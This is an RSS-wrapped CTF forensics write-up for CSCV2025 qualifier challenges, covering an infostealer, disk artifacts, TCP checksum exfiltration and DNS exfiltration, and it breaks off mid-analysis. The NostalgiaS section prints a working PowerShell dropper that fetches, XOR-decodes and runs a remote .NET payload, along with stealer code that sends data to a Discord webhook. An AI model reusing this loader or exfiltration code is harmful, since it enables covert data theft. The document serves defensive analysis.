<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>KAiZ3n</title><description>Demo Site</description><link>https://bruning-frighting.github.io/KAiZ3nThong/</link><language>en</language><item><title>CSCV2025Quals</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/cscv2025quals/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/cscv2025quals/</guid><pubDate>Thu, 23 Oct 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;CSCV2025 Quals&lt;/h1&gt;
&lt;p&gt;Author: KAiZ3n
&lt;img src=&quot;https://hackmd.io/_uploads/SkVt48wCxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h1&gt;NostalgiaS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1kfCU80ex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The challenge description does not specify the initial access vector, so we will proceed with a filesystem examination to gather more information.&lt;/p&gt;
&lt;p&gt;First, I examined the machine&apos;s &lt;code&gt;winevtx&lt;/code&gt; logs and found a suspicious PowerShell command with Event ID 400.
&lt;img src=&quot;https://hackmd.io/_uploads/SyELgKLAee.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SyJ47YLCgl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The script decodes a hex payload and decrypts it via XOR.
&lt;img src=&quot;https://hackmd.io/_uploads/SkNuQtLAge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$AssemblyUrl = &quot;https://pastebin.com/raw/90qeYSHA&quot;
$XorKey = 0x24
$TypeName = &quot;StealerJanai.core.RiderKick&quot;
$MethodName = &quot;Run&quot;

try {
    $WebClient = New-Object System.Net.WebClient
    $encodedContent = $WebClient.DownloadString($AssemblyUrl)
    $WebClient.Dispose()
    
    $hexValues = $encodedContent.Trim() -split &apos;,&apos; | Where-Object { $_ -match &apos;^0x[0-9A-Fa-f]+$&apos; }
    
    $encodedBytes = New-Object byte[] $hexValues.Length
    for ($i = 0; $i -lt $hexValues.Length; $i++) {
        $encodedBytes[$i] = [Convert]::ToByte($hexValues[$i].Trim(), 16)
    }
    
    $originalBytes = New-Object byte[] $encodedBytes.Length
    for ($i = 0; $i -lt $encodedBytes.Length; $i++) {
        $originalBytes[$i] = $encodedBytes[$i] -bxor $XorKey
    }
    
    $assembly = [System.Reflection.Assembly]::Load($originalBytes)
    
    if ($TypeName -ne &quot;&quot; -and $MethodName -ne &quot;&quot;) {
        $targetType = $assembly.GetType($TypeName)
        $methodInfo = $targetType.GetMethod($MethodName, [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
        $methodInfo.Invoke($null, $null)
    }
    
} catch {
    exit 1
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The script proceeds to download a malicious .NET assembly, XORs the payload with &lt;code&gt;0x24&lt;/code&gt;, and executes it using &lt;code&gt;Assembly.Load&lt;/code&gt;.
URL : https://pastebin.com/raw/90qeYSHA
Name : &quot;StealerJanai.core.RiderKick&quot;
&lt;img src=&quot;https://hackmd.io/_uploads/Syf74KLAlx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Starting the analysis with ILSpy, we look into &lt;code&gt;StealerJani.Main()&lt;/code&gt;.
&lt;img src=&quot;https://hackmd.io/_uploads/BJkKBF80ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Execution Flow Summary:&lt;/strong&gt;
Main -&amp;gt; Run -&amp;gt; Initializes RiderKick constructor -&amp;gt; Sets up a Discord webhook URL and calls the AutoRun function.
URL :https://discord.com/api/webhooks/1389141710126452766/D1NUx0HaXI0Zx6xJSEqYy06X7b8HisqM3rfNUw2qdIWt_WbcE8HXLcIpe2oicB7GpU6e&lt;/p&gt;
&lt;p&gt;Inside &lt;code&gt;AutoRun&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// StealerJanai, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// StealerJanai.core.RiderKick
using System;
using System.Threading;

private void AutoRun()
{
	try
	{
		OutputDebugString(&quot;═══════════════════════════════════════════&quot;);
		OutputDebugString(&quot;   RIDER KICK&quot;);
		OutputDebugString(&quot;═══════════════════════════════════════════&quot;);
		OutputDebugString($&quot;Timestamp: {DateTime.Now:yyyy-MM-dd HH:mm:ss}&quot;);
		OutputDebugString($&quot;Computer: {Environment.MachineName}&quot;);
		OutputDebugString(&quot;&quot;);
		SystemInformation systemInformation = new SystemInformation(discordSender.webhookUrl);
		systemInformation.CollectSystemInfo();
		systemInformation.SendToDiscordAsFile();
		Thread.Sleep(2000);
		BrowserDataCollector browserDataCollector = new BrowserDataCollector(discordSender.webhookUrl);
		browserDataCollector.CollectBrowserData();
		browserDataCollector.SendToDiscordAsFile();
	}
	catch (Exception ex)
	{
		OutputDebugString($&quot;Error: {ex.Message}&quot;);
		OutputDebugString($&quot;Stack Trace: {ex.StackTrace}&quot;);
	}
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It will collect specified system and browser data and exfiltrate them to Discord, which acts as a C2, using the Webhook URL.&lt;/p&gt;
&lt;p&gt;In &lt;code&gt;systemInformation.collectionSystemInfo()&lt;/code&gt;, it collects &lt;code&gt;secretInformation&lt;/code&gt;.
&lt;img src=&quot;https://hackmd.io/_uploads/rkIYPt8Rgx.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SJRcDY8Cle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The hardcoded strings are decoded through a function and assembled in the format: &lt;code&gt;text + machineName + &quot;_&quot; + text2 + registryValue + &quot;}&quot;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DecodeMagicToString&lt;/code&gt; is actually a Base62 decoding function.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;// StealerJanai, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// StealerJanai.component.systeminfo.SystemSecretInformationCollector
using System;
using System.Collections.Generic;
using System.Text;

private string DecodeMagicToString(string input)
{
	try
	{
		if (string.IsNullOrEmpty(input))
		{
			return string.Empty;
		}
		List&amp;lt;byte&amp;gt; list = new List&amp;lt;byte&amp;gt;();
		foreach (char value in input)
		{
			int num = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;.IndexOf(value);
			if (num &amp;lt; 0)
			{
				return &quot;Invalid character&quot;;
			}
			int num2 = num;
			for (int num3 = list.Count - 1; num3 &amp;gt;= 0; num3--)
			{
				int num4 = list[num3] * 62 + num2;
				list[num3] = (byte)(num4 % 256);
				num2 = num4 / 256;
			}
			while (num2 &amp;gt; 0)
			{
				list.Insert(0, (byte)(num2 % 256));
				num2 /= 256;
			}
		}
		int j;
		for (j = 0; j &amp;lt; list.Count &amp;amp;&amp;amp; list[j] == 0; j++)
		{
		}
		if (j &amp;gt;= list.Count)
		{
			return string.Empty;
		}
		byte[] array = new byte[list.Count - j];
		for (int k = 0; k &amp;lt; array.Length; k++)
		{
			array[k] = list[j + k];
		}
		return Encoding.ASCII.GetString(array);
	}
	catch (Exception ex)
	{
		return &quot;Decode error: &quot; + ex.Message;
	}
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Proceeding to decode the hardcoded strings and retrieve the MachineName as well as the registry value from &lt;code&gt;SOFTWARE\hensh1n&lt;/code&gt;.
&lt;img src=&quot;https://hackmd.io/_uploads/ByH2stICle.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;SYSTEM machine Name value:
&lt;img src=&quot;https://hackmd.io/_uploads/H1NMhFLCgx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Two hardcoded Base62 strings:
-&amp;gt; CSCV2025{your_computer_
-&amp;gt; has_be3n_kicked_by&lt;/p&gt;
&lt;p&gt;=&amp;gt; Flag: CSCV2025{your_computer_DataDESKTOP-47ICHL6_has_be3n_kicked_byHxrYJgdu}&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;IOC List&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;URL (Payload):&lt;/strong&gt; &lt;code&gt;https://pastebin.com/raw/90qeYSHA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;URL (C2):&lt;/strong&gt; &lt;code&gt;https://discord.com/api/webhooks/1389141710126452766/D1NUx0HaXI0Zx6xJSEqYy06X7b8HisqM3rfNUw2qdIWt_WbcE8HXLcIpe2oicB7GpU6e&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;File Name (In-Memory):&lt;/strong&gt; &lt;code&gt;StealerJanai.dll&lt;/code&gt; (Inferred from TypeName)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Registry Key:&lt;/strong&gt; &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\hensh1n&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;PowerShell Command Snippet:&lt;/strong&gt; &lt;code&gt;(New-Object System.Net.WebClient).DownloadString(&apos;https://pastebin.com/raw/90qeYSHA&apos;)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;.NET TypeName:&lt;/strong&gt; &lt;code&gt;StealerJanai.core.RiderKick&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;.NET MethodName:&lt;/strong&gt; &lt;code&gt;Run&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;XOR Key:&lt;/strong&gt; &lt;code&gt;0x24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Logical Attack Conclusion&lt;/h2&gt;
&lt;p&gt;The attack originates from a PowerShell script, likely executed by the user. This script acts as a dropper, fetching a second-stage payload from Pastebin. The payload is a hex-encoded string which, after being decoded and XORed with the key &lt;code&gt;0x24&lt;/code&gt;, is loaded as a .NET assembly (&lt;code&gt;StealerJanai.dll&lt;/code&gt;) in memory.&lt;/p&gt;
&lt;p&gt;The malware, &lt;code&gt;StealerJanai&lt;/code&gt;, is an infostealer. Upon execution, it gathers system information (including the computer name) and browser data. It also retrieves a specific value from the registry key &lt;code&gt;HKEY_CURRENT_USER\SOFTWARE\hensh1n&lt;/code&gt;. This collected data, including parts of the final flag, is then exfiltrated to a hardcoded Discord webhook URL, which serves as the command-and-control (C2) server. The final flag is constructed by combining decoded strings with the victim&apos;s machine name and the retrieved registry value.&lt;/p&gt;
&lt;h1&gt;Case AlphaS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryWylcU0le.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SkXGlcI0lg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;According to the description, we have a timeline for the incident response, an attacker&apos;s drive, and an external drive from the victim that has been encrypted with BitLocker.
We observed that the Windows user downloaded artifacts recently, likely within the timeframe of the incident.
&lt;img src=&quot;https://hackmd.io/_uploads/Hk8hbqUAel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;I will focus on application artifacts first. SimpleNote seems likely to contain important notes.
Reading the cache for SimpleNote, ChatGPT, and Firefox did not initially yield any results. I was stuck on this for a while, but upon further investigation, I found that logs from SimpleNote and ChatGPT were saved in plaintext.
&lt;img src=&quot;https://hackmd.io/_uploads/B1_SIVD0gg.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1Wd8NPCll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Log Paths:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%APPDATA%\Local\Microsoft\Packages\22490Automattic.Simplenote_9h07f78gwnchp\LocalCache\Roaming\SimpleNote\IndexedDB\file__0.indexeddb.leveldb\0003.log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%APPDATA%\Local\Microsoft\Packages\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\LocalCache\Roaming\ChatGPT\IndexedDB\https_chatgpt.com_0.indexeddb.leveldb\0003.log&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Findings:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Obtained Gmail address: &lt;code&gt;tangthanhvan56@gmail.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Obtained a password for a zip file.
&lt;img src=&quot;https://hackmd.io/_uploads/rJd8tVP0gx.png&quot; alt=&quot;iamge&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkMbbrwCel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Obtained the BitLocker recovery key from ChatGPT logs. Used Autopsy to read the external drive.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;After decrypting with the recovery key, we found a &lt;code&gt;secret.zip&lt;/code&gt; file. Using the password recovered from the SimpleNote logs, we unzipped the file.
&lt;img src=&quot;https://hackmd.io/_uploads/SkHfnNDRge.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJqO3NP0gx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Reading the &lt;code&gt;ssh.txt&lt;/code&gt; file revealed a link to Pastebin.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# access via vpn or proxy if you are blocked
https://pastebin.com/WciYiDEs

cff4c6f0b68c31cb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sy4hnVDAgg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;And we obtained the flag.&lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;IOC Report&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Email:&lt;/strong&gt; &lt;code&gt;tangthanhvan56@gmail.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;File Paths:&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%APPDATA%\Local\Microsoft\Packages\22490Automattic.Simplenote_9h07f78gwnchp\LocalCache\Roaming\SimpleNote\IndexedDB\file__0.indexeddb.leveldb\0003.log&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%APPDATA%\Local\Microsoft\Packages\OpenAI.ChatGPT-Desktop_2p2nqsd0c76g0\LocalCache\Roaming\ChatGPT\IndexedDB\https_chatgpt.com_0.indexeddb.leveldb\\0003.log&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;File Name:&lt;/strong&gt; &lt;code&gt;secret.zip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;code&gt;https://pastebin.com/WciYiDEs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Potential Credential:&lt;/strong&gt; &lt;code&gt;cff4c6f0b68c31cb&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;CovertS&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJXUZHPAel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Based on the challenge description, the scenario involves data exfiltration, and the provided PCAP file is quite large.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/forensics-Covert-7afc4ba9ad51f576437a2c204831153a (1)]
└─$ capinfos challenge.pcapng
File name:           challenge.pcapng
File type:           Wireshark/... - pcapng
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: (not set)
Number of packets:   1,028 k
File size:           1,173 MB
Data size:           1,138 MB
Capture duration:    724.631207 seconds
Earliest packet time: 2025-10-17 12:55:21.034865
Latest packet time:   2025-10-17 13:07:25.666072
Data byte rate:      1,571 kBps
Data bit rate:       12 Mbps
Average packet size: 1107.30 bytes
Average packet rate: 1,419 packets/s
SHA256:              e7f91469cfb05be3d485c7fb5881bdf54d9ad011f4dbdc34e991f8bc8bd8bab4
SHA1:                f5cb15284d47ec909134e8be7934c518a6dd7ee3
Strict time order:   False
Capture hardware:    Intel(R) Core(TM) i5-14600KF (with SSE4.2)
Capture oper-sys:    64-bit Windows 11 (25H2), build 26200
Capture application: Dumpcap (Wireshark) 4.6.0 (v4.6.0-0-gcdfb6721e77c)
Number of interfaces in file: 1
Interface #0 info:
                     Name = \Device\NPF_{B2C223B5-86D4-416A-8D08-EF888EEDF278}
                     Description = vEthernet (WSL (Hyper-V firewall))
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 262144
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Time resolution = 0x06
                     Operating system = 64-bit Windows 11 (25H2), build 26200
                     Number of stat entries = 1
                     Number of packets = 1028287

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Due to the large file size, I segregated the traffic into three smaller files based on protocol: TCP, UDP, and ICMP.&lt;/p&gt;
&lt;p&gt;Upon analyzing the ICMP traffic, I identified exfiltration attempts. However, the payloads consisted solely of the character &quot;A,&quot; suggesting a potential diversion or an attempt to create noise and obstruct the analysis.
&lt;img src=&quot;https://hackmd.io/_uploads/rJ9ONBwRge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Therefore, I decided to deprioritize the ICMP traffic.&lt;/p&gt;
&lt;p&gt;The UDP traffic primarily consisted of the QUIC protocol. Payloads transmitted over QUIC are heavily encrypted, and there were no discernible signs of data exfiltration.
&lt;img src=&quot;https://hackmd.io/_uploads/BkUISHvAxx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Consequently, the investigation shifted its focus to the TCP protocol.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://medium.com/@hhkolberg/how-i-used-tcp-headers-to-exfiltrate-data-a-simple-but-powerful-learning-exercise-7d9812ce81c1&quot;&gt;Reference Document&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Drawing inspiration from the referenced blog post, my initial approach was to filter for TCP SYN packets on ports other than 443. This strategy aimed to exclude HTTPS traffic, where the TLS handshake occurs over port 443, thereby narrowing the scope of the investigation.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJkRDSvAxe.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;In a packet with source IP &lt;code&gt;192.168.203.91&lt;/code&gt; and destination IP &lt;code&gt;192.168.192.1&lt;/code&gt;, using ports 20981 and 3239, I observed that the TCP checksum field contained two characters that appeared to be part of a Base64 encoded string. I proceeded to dump this data using &lt;code&gt;tshark&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;└─$ tshark -r tcp.pcap -Y &quot;ip.addr==192.168.192.1 &amp;amp;&amp;amp; ip.addr==192.168.203.91&quot; -Tfields -e tcp.checksum &amp;gt; out
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;After hex decoding, it was evident that the string was Base64 encoded.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SGVsbG8gZXZlcnlvbmUsDQpIb3cgYXJlIHlvdSBkb2luZz8gQSB2ZXJ5IHdhcm0gd2VsY29tZSB0byBDU0NWMjAyNSENCg0KSSdtIHJlYWxseSBnbGFkIHRvIHNlZSB5b3UgaGVyZSBhbmQgSSBob3BlIHlvdSdyZSByZWFkeSBmb3IgYW4gZXhjaXRpbmcgZXZlbnQgYWhlYWQuIFRoaXMgQ1RGIGlzIGFsbCBhYm91dCBjaGFsbGVuZ2luZyB5b3VyIHNraWxscywgbGVhcm5pbmcgbmV3IHRyaWNrcywgYW5kIG9mIGNvdXJzZSAtIGhhdmluZyBmdW4gYWxvbmcgdGhlIHdheS4gQ29uc2lkZXIgdGhpcyBsaXR0bGUgbWVzc2FnZSBub3QgYXMgYSBjaGFsbGVuZ2UgaXRzZWxmLCBidXQgc2ltcGx5IGFzIG15IHdheSBvZiBzYXlpbmcgaGVsbG8gdG8gYWxsIG9mIHlvdSBhbWF6aW5nIHBsYXllcnMuDQoNClRha2UgYSBtb21lbnQsIGdldCBjb21mb3J0YWJsZSwgYW5kIGVuam95IHRoZSByaWRlLiBXaGV0aGVyIHlvdSdyZSBoZXJlIHRvIGNvbXBldGUgZmllcmNlbHksIHRvIGxlYXJuIHNvbWV0aGluZyBuZXcsIG9yIGp1c3QgdG8gaGF2ZSBhIGdvb2QgdGltZSwgSSBob3BlIENTQ1YyMDI1IHdpbGwgYmUgYW4gdW5mb3JnZXR0YWJsZSBleHBlcmllbmNlIGZvciB5b3UgKG5vdCB0aGlzIGNoYWxsZW5nZSwgcGxzIGZvcmdldCB0aGlzIHNoKnQgT19PKQ0KDQpBbmQgbm93LCB3aXRob3V0IGtlZXBpbmcgeW91IHdhaXRpbmcgYW55IGxvbmdlci4uLg0KDQooc29tZW9uZSBhY2NpZGVudGFsbHkgc2VudCBteSBjaGFsIHZpYSBlbWFpbCBzbyBoZXJlIGlzIHlvdXIgbmV3IGZsYWc6KQ0KDQpDU0NWMjAyNXtteV9jaGFsX2dvdF9sZWFrZWRfYmVmb3JlX3RoZV9jb250ZXN0X2JydWhfaGVyZV9pc195b3VyX25ld19mbGFnX2I4ODkxYzRlMTQ3YzQ1MmI4Y2M2NjQyZjEwNDAwNDUyfQ0KDQpeX14gc3J5IGZvciB0aGUgbWVzcw==
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;Hello everyone,
How are you doing? A very warm welcome to CSCV2025!

I&apos;m really glad to see you here and I hope you&apos;re ready for an exciting event ahead. This CTF is all about challenging your skills, learning new tricks, and of course - having fun along the way. Consider this little message not as a challenge itself, but simply as my way of saying hello to all of you amazing players.

Take a moment, get comfortable, and enjoy the ride. Whether you&apos;re here to compete fiercely, to learn something new, or just to have a good time, I hope CSCV2025 will be an unforgettable experience for you (not this challenge, pls forget this sh*t O_O)

And now, without keeping you waiting any longer...

(someone accidentally sent my chal via email so here is your new flag:)

CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}

^_^ sry for the mess
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Flag: &lt;code&gt;CSCV2025{my_chal_got_leaked_before_the_contest_bruh_here_is_your_new_flag_b8891c4e147c452b8cc6642f10400452}&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;DNS Exfil&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sk0V9SDRxe.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Hyl_qHvAxl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;This report details the analysis of a data exfiltration attempt using DNS queries. The investigation focuses on dissecting network traffic and correlating it with server logs to understand the attacker&apos;s methodology.&lt;/p&gt;
&lt;h2&gt;Initial Network Traffic Analysis&lt;/h2&gt;
&lt;p&gt;The investigation began by examining the provided PCAP file (&lt;code&gt;10.10.0.53_ns_capture.pcap&lt;/code&gt;) using &lt;code&gt;tshark&lt;/code&gt;. The first step was to extract all DNS query names to identify any unusual patterns.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
└─$ tshark -r &quot;dnsexfil/10.10.0.53_ns_capture.pcap&quot; -Tfields -e dns.qry.name
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ByzNsBwRee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Suspicious queries to a domain, &lt;code&gt;cloudflar3.com&lt;/code&gt;, were identified. The following command was used to filter for these specific queries and extract relevant metadata, including the full query name, source/destination IPs, and timestamp.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;──(thong㉿MSI)-[/mnt/c/users/tttho/Downloads/dns_exfil (1)]
└─$ tshark -r &quot;dnsexfil/10.10.0.53_ns_capture.pcap&quot; -Y &quot;dns.qry.name contains \&quot;cloudflar3\&quot;&quot; -Tfields -e dns.qry.name -e ip.src -e ip.dst  -e frame.time
p.c7aec5d0d81ba8748acac6931e5add6c24b635181443d0b9d2.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.192821000 +07
p.c7aec5d0d81ba8748acac6931e5add6c24b635181443d0b9d2.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.212821000 +07
p.f8aad90d5fc7774c1e7ee451e755831cd02bfaac3204aed8a4.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.426899000 +07
p.f8aad90d5fc7774c1e7ee451e755831cd02bfaac3204aed8a4.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.446899000 +07
p.3dfec8a22cde4db4463db2c35742062a415441f526daecb59b.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.497508000 +07
p.3dfec8a22cde4db4463db2c35742062a415441f526daecb59b.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.517508000 +07
p.f6af1ecb8cc9827a259401e850e5e07fdc3c1137f1.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:00.599459000 +07
p.f6af1ecb8cc9827a259401e850e5e07fdc3c1137f1.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:00.619459000 +07
f.6837abc6655c12c454abe0ca85a596e98473172829581235dd.hex.cloudflar3.com 10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:03.714885000 +07
f.6837abc6655c12c454abe0ca85a596e98473172829581235dd.hex.cloudflar3.com 10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:03.734885000 +07
f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com     10.10.5.80      10.10.0.53      Oct 15, 2025 13:24:03.769962000 +07
f.95380b06bf6dd06b89118b0003ea044700a5f2c4c106c3.hex.cloudflar3.com     10.10.0.53      10.10.5.80      Oct 15, 2025 13:24:03.789962000 +07
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The subdomains appeared to be hex-encoded data. The timeline of these events, starting around &lt;strong&gt;Oct 15, 2025 13:24:00 UTC+7&lt;/strong&gt;, was noted for correlation with other data sources.&lt;/p&gt;
&lt;h2&gt;Log Correlation and Server Analysis&lt;/h2&gt;
&lt;p&gt;Pivoting to the destination IP address, &lt;code&gt;10.10.5.80&lt;/code&gt;, an analysis of server logs was conducted. The access and error logs for the webserver were found to have entries corresponding to the timeline of the suspicious DNS traffic.&lt;/p&gt;
&lt;p&gt;The access log revealed a connection to an administrative page from the IP address &lt;code&gt;10.55.1.77&lt;/code&gt;.
&lt;img src=&quot;https://hackmd.io/_uploads/S1U5THP0ll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Simultaneously, the error log showed a large file upload error directed at &lt;code&gt;intra.portal.local&lt;/code&gt;. This indicates a potential web shell upload or data staging attempt.
&lt;img src=&quot;https://hackmd.io/_uploads/HkBoASwRge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Further investigation of the &lt;code&gt;intra.portal.local&lt;/code&gt; domain confirmed the upload of a PHP web shell named &lt;code&gt;getfile.php&lt;/code&gt;.
&lt;img src=&quot;https://hackmd.io/_uploads/H1RaJUPCeg.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Sk-mgLP0xx.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Decryption of Exfiltrated Data&lt;/h2&gt;
&lt;p&gt;A debug variable found on the server provided the key to understanding the exfiltrated data:
&lt;code&gt;DEBUG VARS: APP_SECRET=F0r3ns1c-2025-CSCV; DATE_UTC=20251010&lt;/code&gt;
&lt;code&gt;H=SHA256(APP_SECRET); AES_KEY=H[0..15]; AES_IV=H[16..31];&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This indicates that the exfiltrated data seen in the DNS query subdomains is likely encrypted. The payload is constructed using an AES key derived from the SHA256 hash of the &lt;code&gt;APP_SECRET&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The structure of the DNS payload was analyzed.
&lt;img src=&quot;https://hackmd.io/_uploads/S15sW8v0ge.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;The hex-encoded string in the subdomain is split to separate the ciphertext from another component, possibly an IV or a MAC.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; a = &quot;5769179ccdf950443501d9978f52ddb51b70ca0d4f607a976c6639914af7c7a6&quot;
&amp;gt;&amp;gt;&amp;gt; print(a[32:])
1b70ca0d4f607a976c6639914af7c7a6
